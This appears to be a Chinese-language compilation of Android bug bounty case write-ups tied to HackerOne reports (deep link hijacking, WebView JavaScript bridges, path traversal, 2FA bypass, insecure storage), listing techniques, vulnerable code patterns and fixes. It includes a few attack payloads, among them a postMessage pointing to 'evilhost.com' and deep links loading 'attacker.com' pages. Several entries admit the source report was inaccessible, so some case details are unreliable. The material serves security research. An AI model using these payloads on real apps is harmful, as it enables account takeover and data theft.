...
## 2FA短信重发逻辑缺陷导致账户锁定
### 案例：Shopify (报告: [https://hackerone.com/reports/1416964](https://hackerone.com/reports/1416964))
#### 挖掘手法
...
在用户尝试绑定手机号码或邮箱时，后端代码直接信任用户提交的号码，而没有先进行验证（如发送验证码并要求用户输入）。**Vulnerable Pattern (Java/Spring Boot 概念示例):**
...
2. **短信重发机制的速率限制缺陷：**  
速率限制的粒度过粗，基于被攻击的资源（手机号码）而非攻击者（用户会话/IP地址）。**Vulnerable Pattern (伪代码):**
...
### 案例：Nextcloud (报告: [https://hackerone.com/reports/631206](https://hackerone.com/reports/631206))
#### 挖掘手法
...
### 案例：Nextcloud (报告: [https://hackerone.com/reports/331489](https://hackerone.com/reports/331489))
#### 挖掘手法
...
当应用使用`ContentProvider`或`FileProvider`向其他应用（如系统文件管理器）共享文件时，其核心方法（如`query()`, `openFile()`, `getType()`）必须包含对应用安全状态的检查。如果应用的安全锁逻辑（例如，检查用户是否已输入PIN码）只在主Activity或应用生命周期回调中实现，而未在Content Provider中重复实现或引用，就会导致绕过。**代码模式示例（Java/Kotlin）：**
...
Nextcloud的报告中提到，文件可以从本地缓存路径`/storage/emulated/0/Android/media/com.nextcloud.client/nextcloud/...`直接访问。虽然该路径位于应用的外部存储私有目录（`/Android/media/`下），但在某些Android版本或配置下，系统文件管理器可能具有访问权限，或者应用通过Content Provider暴露了该路径。**配置模式示例（AndroidManifest.xml）：**  
...
3. **安全状态管理不一致：**  
应用的安全状态（如“已解锁”或“已锁定”）应该是一个**全局且可靠**的状态。如果应用依赖于Activity的生命周期（例如，只在`onResume()`中检查PIN码），而Content Provider在后台被调用时，该状态没有被正确维护或检查，就会出现安全漏洞。**安全代码模式（修复建议）：**  
...
### 案例：Evernote for Android (报告: [https://hackerone.com/reports/1362313](https://hackerone.com/reports/1362313))
#### 挖掘手法
...
### 案例：IRCCloud (报告: [https://hackerone.com/reports/283058](https://hackerone.com/reports/283058))
#### 挖掘手法
...
### 案例：Uber Rider (报告: [https://hackerone.com/reports/1416970](https://hackerone.com/reports/1416970))
#### 挖掘手法
...
### 案例：Quora (报告: [https://hackerone.com/reports/189793](https://hackerone.com/reports/189793))
#### 挖掘手法
...
"{\"messageName\":\"switchInstance\",\"data\":{\"host\":\"evilhost.com\",\"instance_name\":\"evilhost\",\"scheme\":\"https\"}}{% endraw %}"
);
</script>
...
### 案例：Slack (报告: [https://hackerone.com/reports/200427](https://hackerone.com/reports/200427))
#### 挖掘手法
...
### 案例：OwnCloud Android Application (报告: [https://hackerone.com/reports/87835](https://hackerone.com/reports/87835))
#### 挖掘手法
...
### 案例：Snapchat (报告: [https://hackerone.com/reports/54631](https://hackerone.com/reports/54631))
#### 挖掘手法
...
### 案例：Reddit (报告: [https://hackerone.com/reports/1325649](https://hackerone.com/reports/1325649))
#### 挖掘手法
...
### 案例：Evernote (报告: [https://hackerone.com/reports/1416950](https://hackerone.com/reports/1416950))
#### 挖掘手法
...
## Android广播劫持导致信息泄露
### 案例：Nextcloud (报告: [https://hackerone.com/reports/167481](https://hackerone.com/reports/167481))
#### 挖掘手法
...
### 案例：Shopify Android Client (报告: [https://hackerone.com/reports/56002](https://hackerone.com/reports/56002))
#### 挖掘手法
...
### 案例：IRCCloud (报告: [https://hackerone.com/reports/288955](https://hackerone.com/reports/288955))
#### 挖掘手法
...
### 案例：Quora (报告: [https://hackerone.com/reports/258460](https://hackerone.com/reports/258460))
#### 挖掘手法
...
当组件在`AndroidManifest.xml`中配置为`exported="true"`时，任何应用都可以调用它。如果该组件接收一个Intent，并使用Intent中的数据进行敏感操作（如文件读写、网络请求），而没有对数据进行安全检查，就会导致漏洞。**示例（AndroidManifest.xml）：**
...
在暴露的组件（如本例中的`UploadService`）的代码中，直接使用从Intent中获取的字符串作为文件路径，而没有限制其只能访问公共目录或特定文件。**示例（Java/Kotlin 代码）：**
...
1. **限制组件暴露：** 除非绝对必要，否则应将组件的`android:exported`属性设置为`false`。如果必须暴露，应通过`android:permission`属性设置严格的权限，确保只有具备特定权限的应用才能调用。**示例（修复后的AndroidManifest.xml）：**
...
2. **严格校验文件路径：** 如果组件必须处理外部传入的文件路径，应确保路径是安全的。例如，只允许访问应用沙箱内的特定子目录，或使用`Context.getFileStreamPath()`等方法来确保路径的合法性。**示例（Java/Kotlin 代码）：**
...
### 案例：Odnoklassniki Android应用 (报告: [https://hackerone.com/reports/97295](https://hackerone.com/reports/97295))
#### 挖掘手法
...
## Android路径遍历导致远程代码执行
### 案例：Evernote for Android (报告: [https://hackerone.com/reports/1416969](https://hackerone.com/reports/1416969))
#### 挖掘手法
...
### 案例：Nextcloud Android App (报告: [https://hackerone.com/reports/291764](https://hackerone.com/reports/291764))
#### 挖掘手法
...
### 案例：Google Android System Component (报告: [https://hackerone.com/reports/1416948](https://hackerone.com/reports/1416948))
#### 挖掘手法
...
### 案例：MetaMask Mobile (Android) (报告: [https://hackerone.com/reports/1941767](https://hackerone.com/reports/1941767))
#### 挖掘手法
...
## Deep Link CSRF
### 案例：Periscope (报告: [https://hackerone.com/reports/583987](https://hackerone.com/reports/583987))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416951](https://hackerone.com/reports/1416951))
#### 挖掘手法
...
## Deep Link Intent劫持
### 案例：某社交应用 (SocialApp) (报告: [https://hackerone.com/reports/1417005](https://hackerone.com/reports/1417005))
#### 挖掘手法
...
### 案例：Zomato (报告: [https://hackerone.com/reports/328486](https://hackerone.com/reports/328486))
#### 挖掘手法
...
### 案例：某Android应用 (com.example.app) (报告: [https://hackerone.com/reports/1416973](https://hackerone.com/reports/1416973))
#### 挖掘手法
...
当Deep Link中的查询参数被用于构建一个`javascript:` URL或直接插入到HTML/JavaScript字符串中时，如果未进行充分的输入验证和输出编码，就会导致XSS。**Java/Kotlin 代码示例 (不安全模式):**
...
2. **WebView配置不当：**  
即使参数经过了验证，如果WebView配置了不安全的设置，也可能导致漏洞。例如，启用了`setAllowFileAccess(true)`和`setJavaScriptEnabled(true)`，并暴露了Java对象给JavaScript（`addJavascriptInterface`），如果Deep Link可以控制加载的本地文件，则可能导致更严重的攻击。**Manifest 配置示例 (Deep Link 注册):**
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416957](https://hackerone.com/reports/1416957))
#### 挖掘手法
...
### 案例：IRCCloud (报告: [https://hackerone.com/reports/283063](https://hackerone.com/reports/283063))
#### 挖掘手法
...
## Deep Link 会话劫持
### 案例：KAYAK (报告: [https://hackerone.com/reports/1416998](https://hackerone.com/reports/1416998))
#### 挖掘手法
...
## Deep Link 劫持
### 案例：Twitter (报告: [https://hackerone.com/reports/1417003](https://hackerone.com/reports/1417003))
#### 挖掘手法
...
## Deep Link 触发的任意文件写入
### 案例：MetaMask Android (报告: [https://hackerone.com/reports/1768166](https://hackerone.com/reports/1768166))
#### 挖掘手法
...
## Deep Link 账户劫持
### 案例：Android Target App (报告: [https://hackerone.com/reports/1417001](https://hackerone.com/reports/1417001))
#### 挖掘手法
...
## Deep Link 验证不当
### 案例：无法确定（原报告无法访问） (报告: [https://hackerone.com/reports/1416958](https://hackerone.com/reports/1416958))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416952](https://hackerone.com/reports/1416952))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416954](https://hackerone.com/reports/1416954))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1417015](https://hackerone.com/reports/1417015))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1417004](https://hackerone.com/reports/1417004))
#### 挖掘手法
...
### 案例：未知 (HackerOne报告1416991) (报告: [https://hackerone.com/reports/1416991](https://hackerone.com/reports/1416991))
#### 挖掘手法
...
### 案例：Twitter Lite (报告: [https://hackerone.com/reports/1189966](https://hackerone.com/reports/1189966))
#### 挖掘手法
...
### 案例：Android 应用 (HackerOne Report 1417018) (报告: [https://hackerone.com/reports/1417018](https://hackerone.com/reports/1417018))
#### 挖掘手法
...
## Deep Link/WebView劫持
### 案例：TikTok (报告: [https://hackerone.com/reports/1416986](https://hackerone.com/reports/1416986))
#### 挖掘手法
...
在处理Deep Link（通过`<intent-filter>`或`NavGraph`）时，未对从外部Intent中提取的URL参数进行严格的白名单验证，允许加载任意外部域名。**易漏洞的Java/Kotlin代码模式（概念性）：**
...
在WebView中使用了`addJavascriptInterface()`方法，并且暴露给Web内容的Java对象包含敏感功能（如执行网络请求、访问本地文件、获取Token等）。**易漏洞的Java/Kotlin代码模式：**
...
## Deep Link不安全URL验证
### 案例：某Android应用 (报告: [https://hackerone.com/reports/1416985](https://hackerone.com/reports/1416985))
#### 挖掘手法
...
## Deep Link会话劫持
### 案例：KAYAK (报告: [https://hackerone.com/reports/1417020](https://hackerone.com/reports/1417020))
#### 挖掘手法
...
## Deep Link会话劫持与账户接管
### 案例：KAYAK (报告: [https://hackerone.com/reports/1689466](https://hackerone.com/reports/1689466))
#### 挖掘手法
...
### 案例：KAYAK (报告: [https://hackerone.com/reports/1417008](https://hackerone.com/reports/1417008))
#### 挖掘手法
...
## Deep Link劫持
### 案例：KAYAK (报告: [https://hackerone.com/reports/1667998](https://hackerone.com/reports/1667998))
#### 挖掘手法
...
## Deep Link劫持导致的账户接管
### 案例：Arrive (报告: [https://hackerone.com/reports/855618](https://hackerone.com/reports/855618))
#### 挖掘手法
...
### 案例：KAYAK (报告: [https://hackerone.com/reports/1416997](https://hackerone.com/reports/1416997))
#### 挖掘手法
...
### 案例：Grab (报告: [https://hackerone.com/reports/401793](https://hackerone.com/reports/401793))
#### 挖掘手法
...
### 案例：某Android应用 (报告: [https://hackerone.com/reports/1417007](https://hackerone.com/reports/1417007))
#### 挖掘手法
...
### 案例：Deliveries Package Tracker (报告: [https://hackerone.com/reports/1416949](https://hackerone.com/reports/1416949))
#### 挖掘手法
...
当一个`Activity`被设置为可被外部应用唤醒（`exported="true"`），并且其处理逻辑直接从`Intent`中获取URL参数并将其加载到`WebView`中，而没有检查URL的来源或协议时，就会出现此问题。**代码示例（Java/Kotlin）：**
...
## Deep Link导致的会话劫持
### 案例：KAYAK (报告: [https://hackerone.com/reports/1416992](https://hackerone.com/reports/1416992))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416983](https://hackerone.com/reports/1416983))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1417011](https://hackerone.com/reports/1417011))
#### 挖掘手法
...
2. **恶意网页加载与JavaScript接口调用：** 当受害者点击此链接后，TikTok应用会在其WebView中加载`<ATTACKER_URL>`。由于WebView中注入了具有高权限的JavaScript桥接，恶意网页中的JavaScript代码可以直接调用应用内部的Java方法。**JavaScript调用示例：**恶意网页中的JavaScript代码会构造一个JSON字符串，用于调用暴露的Java方法。例如，调用一个名为`fetchUserData`的Java方法：
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416987](https://hackerone.com/reports/1416987))
#### 挖掘手法
...
### 案例：KAYAK (com.kayak.android) (报告: [https://hackerone.com/reports/1416978](https://hackerone.com/reports/1416978))
#### 挖掘手法
...
## Deep Link账户劫持（推断）
### 案例：未知应用 (报告: [https://hackerone.com/reports/1416962](https://hackerone.com/reports/1416962))
#### 挖掘手法
...
### 案例：KAYAK (com.kayak.android) (报告: [https://hackerone.com/reports/1416960](https://hackerone.com/reports/1416960))
#### 挖掘手法
...
## Deep Link路径遍历
### 案例：某知名Android应用 (报告: [https://hackerone.com/reports/1416966](https://hackerone.com/reports/1416966))
#### 挖掘手法
...
### 案例：某Android应用 (报告: [https://hackerone.com/reports/1416972](https://hackerone.com/reports/1416972))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416981](https://hackerone.com/reports/1416981))
#### 挖掘手法
...
### 案例：Uber (报告: [https://hackerone.com/reports/1416993](https://hackerone.com/reports/1416993))
#### 挖掘手法
...
### 案例：一个未公开的Android应用 (报告: [https://hackerone.com/reports/1416996](https://hackerone.com/reports/1416996))
#### 挖掘手法
...
### 案例：Basecamp (报告: [https://hackerone.com/reports/1416999](https://hackerone.com/reports/1416999))
#### 挖掘手法
...
### 案例：Evernote (报告: [https://hackerone.com/reports/1417000](https://hackerone.com/reports/1417000))
#### 挖掘手法
...
### 案例：Shopify (报告: [https://hackerone.com/reports/1417014](https://hackerone.com/reports/1417014))
#### 挖掘手法
...
### 案例：一款流行的社交媒体应用 (报告: [https://hackerone.com/reports/1416994](https://hackerone.com/reports/1416994))
#### 挖掘手法
...
### 案例：Basecamp (com.basecamp.bc3) (报告: [https://hackerone.com/reports/1637194](https://hackerone.com/reports/1637194))
#### 挖掘手法
...
### 案例：A popular social media app (报告: [https://hackerone.com/reports/1416975](https://hackerone.com/reports/1416975))
#### 挖掘手法
...
2. **构造恶意Deep Link**：攻击者将上述恶意页面的URL嵌入到一个Deep Link中。该Deep Link指向目标应用的脆弱Activity。`exampleapp://webview?url=https://attacker.com/malicious.html`
...
### 案例：Basecamp (com.basecamp.bc3) (报告: [https://hackerone.com/reports/1710668](https://hackerone.com/reports/1710668))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416974](https://hackerone.com/reports/1416974))
#### 挖掘手法
...
### 案例：Basecamp (报告: [https://hackerone.com/reports/2553411](https://hackerone.com/reports/2553411))
#### 挖掘手法
...
### 案例：Uber (Android) (报告: [https://hackerone.com/reports/1416940](https://hackerone.com/reports/1416940))
#### 挖掘手法
...
### 案例：TikTok (报告: [https://hackerone.com/reports/1416953](https://hackerone.com/reports/1416953))
#### 挖掘手法
...
## Directory Traversal
### 案例：Slack for Android (报告: [https://hackerone.com/reports/1378889](https://hackerone.com/reports/1378889))
#### 挖掘手法
...
## Fragment Injection
### 案例：Twitter Android App (报告: [https://hackerone.com/reports/43988](https://hackerone.com/reports/43988))
#### 挖掘手法
...
### 案例：Brave Browser (报告: [https://hackerone.com/reports/176065](https://hackerone.com/reports/176065))
#### 挖掘手法
...
1. **直接字符串拼接构建HTML：**  
当使用字符串拼接（如Java中的`+`操作符或`StringBuilder`）来动态生成HTML内容时，如果拼接的变量来自用户输入或外部数据源（如URL参数、API响应、数据库记录等），就极易引入HTML注入或XSS漏洞。**Java示例（来自报告）：**
...
2. **缺少上下文敏感的输出编码：**  
在将外部数据插入到HTML的不同位置时，需要进行不同类型的编码。例如，插入到HTML标签内容中时，需要进行HTML实体编码。如果程序只是简单地将原始字符串插入，就会导致注入。**安全修复示例（概念）：**
...
### 案例：Nextcloud Talk (报告: [https://hackerone.com/reports/1416941](https://hackerone.com/reports/1416941))
#### 挖掘手法
...
## Intent Scheme认证绕过
### 案例：Nextcloud (报告: [https://hackerone.com/reports/490946](https://hackerone.com/reports/490946))
#### 挖掘手法
...
## Intent URI注入与未授权访问
### 案例：Twitter lite(Android) (报告: [https://hackerone.com/reports/499348](https://hackerone.com/reports/499348))
#### 挖掘手法
...
## Intent重定向
### 案例：某大型Android应用 (报告: [https://hackerone.com/reports/1416967](https://hackerone.com/reports/1416967))
#### 挖掘手法
...
## Intent重定向导致任意文件读取
### 案例：Google Photos (报告: [https://hackerone.com/reports/1417002](https://hackerone.com/reports/1417002))
#### 挖掘手法
...
当一个导出的Activity（`android:exported="true"`）从Intent的`Extra`中获取一个文件路径，并直接用于文件操作时，就可能存在漏洞。**Vulnerable Code (Java/Kotlin Pseudo-code):**
...
当Activity处理一个`content://`或`file://` URI时，如果未正确验证URI的权限或路径，也可能导致任意文件读取。**Vulnerable Code (Java/Kotlin Pseudo-code):**
...
## OTP验证码绕过 (缺乏速率限制)
### 案例：Grab Android App (报告: [https://hackerone.com/reports/205000](https://hackerone.com/reports/205000))
#### 挖掘手法
...
### 案例：Nextcloud Android client (报告: [https://hackerone.com/reports/1416963](https://hackerone.com/reports/1416963))
#### 挖掘手法
...
### 案例：Evernote (报告: [https://hackerone.com/reports/1417010](https://hackerone.com/reports/1417010))
#### 挖掘手法
...
## Use-After-Free (UAF)
### 案例：Google Chrome (Android) (报告: [https://hackerone.com/reports/1417017](https://hackerone.com/reports/1417017))
#### 挖掘手法
...
### 案例：Android WebView (Chromium/Blink Engine) (报告: [https://hackerone.com/reports/1416988](https://hackerone.com/reports/1416988))
#### 挖掘手法
...
### 案例：[无法确定] (报告: [https://hackerone.com/reports/1417016](https://hackerone.com/reports/1417016))
#### 挖掘手法
由于HackerOne报告（[https://hackerone.com/reports/1417016）需要登录才能访问，且通过多次公开搜索尝试（包括使用报告编号、&quot;Android&quot;、&quot;vulnerability&quot;、&quot;writeup&quot;、&quot;Path](https://hackerone.com/reports/1417016）需要登录才能访问，且通过多次公开搜索尝试（包括使用报告编号、"Android"、"vulnerability"、"writeup"、"Path) Traversal"等关键词组合）均未能找到该报告的公开披露内容、摘要或相关的技术分析文章，因此无法获取详细的漏洞挖掘手法和步骤。
...
#### 技术细节
由于HackerOne报告（[https://hackerone.com/reports/1417016）需要登录才能访问，且无法通过公开搜索获取其内容，因此无法提供具体的漏洞利用技术细节、关键代码或Payload。](https://hackerone.com/reports/1417016）需要登录才能访问，且无法通过公开搜索获取其内容，因此无法提供具体的漏洞利用技术细节、关键代码或Payload。)
...
#### 易出现漏洞的代码模式
由于HackerOne报告（[https://hackerone.com/reports/1417016）需要登录才能访问，且无法通过公开搜索获取其内容，因此无法提供针对该漏洞的易出现代码模式和配置。](https://hackerone.com/reports/1417016）需要登录才能访问，且无法通过公开搜索获取其内容，因此无法提供针对该漏洞的易出现代码模式和配置。)
...
### 案例：Google Android App (报告: [https://hackerone.com/reports/1416942](https://hackerone.com/reports/1416942))
#### 挖掘手法
...
3. **构造Deep Link：** 攻击者将恶意URL作为参数值，构造完整的Deep Link Payload。**Payload (Deep Link URI):**

```plain
app://internal/webview?url=https://attacker.com/xss.html
```

4. **触发漏洞：** 攻击者通过恶意应用、短信、邮件或网页诱导受害者点击该Deep Link。在测试环境中，可以使用ADB命令模拟触发：**ADB Command:**
...
## 不安全Deep Link验证
### 案例：Android System Component (Google) (报告: [https://hackerone.com/reports/1416984](https://hackerone.com/reports/1416984))
#### 挖掘手法
...
### 案例：Google Android Framework (报告: [https://hackerone.com/reports/1416955](https://hackerone.com/reports/1416955))
#### 挖掘手法
...
### 案例：Twitter Lite (报告: [https://hackerone.com/reports/808499](https://hackerone.com/reports/808499))
#### 挖掘手法
...
## 不安全SSL配置与API密钥泄露
### 案例：Coinbase (报告: [https://hackerone.com/reports/5786](https://hackerone.com/reports/5786))
#### 挖掘手法
...
### 案例：Vine Android App (报告: [https://hackerone.com/reports/44727](https://hackerone.com/reports/44727))
#### 挖掘手法
...
4. **敏感文件识别：** 在该目录下，攻击者重点检查了数据库（databases）和共享偏好设置（shared_prefs）等目录。报告中明确指出，在`/data/data/co.vine.android/databases/`路径下发现了名为`webview.db`的SQLite数据库文件。
...
8. **PoC制作：** 攻击者通过截图（SQLite_POC.png）展示了数据库中明文存储的凭证，作为漏洞存在的直接证据。
...
### 案例：Coinbase (报告: [https://hackerone.com/reports/201855](https://hackerone.com/reports/201855))
#### 挖掘手法
...
`SharedPreferences`是Android中最常用的轻量级数据存储方式，但其默认存储在应用的私有目录下的XML文件中，在Root设备上可被直接读取。**易漏洞代码示例 (Java/Kotlin)：**
...
2. **使用SQLite数据库存储敏感信息：**  
将敏感数据存储在未加密的SQLite数据库中。数据库文件同样位于应用的私有目录，可被Root用户直接复制和查看。**易漏洞代码示例 (SQL)：**
...
### 案例：Target (报告: [https://hackerone.com/reports/1416945](https://hackerone.com/reports/1416945))
#### 挖掘手法
...
_易受攻击的_`AndroidManifest.xml`_配置示例:_
...
## 双因素认证（2FA）绕过（暴力破解）
### 案例：Grab (报告: [https://hackerone.com/reports/202425](https://hackerone.com/reports/202425))
#### 挖掘手法
...
### 案例：Android SoC (System on Chip) (报告: [https://hackerone.com/reports/1417006](https://hackerone.com/reports/1417006))
#### 挖掘手法
...
### 案例：Bitwarden (报告: [https://hackerone.com/reports/289000](https://hackerone.com/reports/289000))
#### 挖掘手法
...
### 案例：某大型社交/电商Android应用 (HackerOne Report #1416943) (报告: [https://hackerone.com/reports/1416943](https://hackerone.com/reports/1416943))
#### 挖掘手法
...
## 本地数据存储不安全
### 案例：Whisper (报告: [https://hackerone.com/reports/57918](https://hackerone.com/reports/57918))
#### 挖掘手法
...
1. **SQLite数据库明文存储敏感数据**  
当使用Android原生的 `SQLiteOpenHelper` 或基于它的ORM框架（如Room）时，如果直接将敏感数据（如用户令牌、密码哈希、聊天记录）写入数据库，而没有使用加密扩展（如SQLCipher），则数据将以明文形式存储在设备上。**易漏洞代码示例 (Java/Kotlin)**:
...
`SharedPreferences` 默认以XML文件的形式存储在应用的私有目录中。虽然访问受限，但如果存储了高敏感信息（如密码、API Key），在设备被Root后仍会泄露。**易漏洞代码示例 (Java/Kotlin)**:
...
### 案例：Google Android (报告: [https://hackerone.com/reports/1416961](https://hackerone.com/reports/1416961))
#### 挖掘手法
...
## 目录遍历
### 案例：Grafana (报告: [https://hackerone.com/reports/1416959](https://hackerone.com/reports/1416959))
#### 挖掘手法
...
### 案例：Evernote Android (报告: [https://hackerone.com/reports/1377748](https://hackerone.com/reports/1377748))
#### 挖掘手法
...
## 硬编码API密钥泄露
### 案例：Reverb.com Android App (报告: [https://hackerone.com/reports/351555](https://hackerone.com/reports/351555))
#### 挖掘手法
...
## 组件暴露导致私有文件窃取
### 案例：ownCloud (报告: [https://hackerone.com/reports/1454002](https://hackerone.com/reports/1454002))
#### 挖掘手法
...
## 认证令牌泄露与搜索引擎缓存
### 案例：Grab (报告: [https://hackerone.com/reports/221558](https://hackerone.com/reports/221558))
#### 挖掘手法
...
### 案例：Vine (报告: [https://hackerone.com/reports/187714](https://hackerone.com/reports/187714))
#### 挖掘手法
...
1. **未标准化用户输入：** 在用户注册或更新邮箱时，未将邮箱地址统一转换为小写（或大写）格式。**错误代码示例（Java/Kotlin）：**
...
2. **数据库配置或查询问题：** 即使应用层进行了标准化，如果数据库配置为**大小写敏感**（例如某些Linux上的MySQL配置），并且查询时未强制大小写不敏感，也可能导致问题。**配置/查询缺陷示例：**
...
## 路径遍历绕过导致任意文件上传
### 案例：Nextcloud Android Client (报告: [https://hackerone.com/reports/1416976](https://hackerone.com/reports/1416976))
#### 挖掘手法
...
来源：[https://github.com/s7safe/android-h1/edit/main/README.md](https://github.com/s7safe/android-h1/edit/main/README.md)
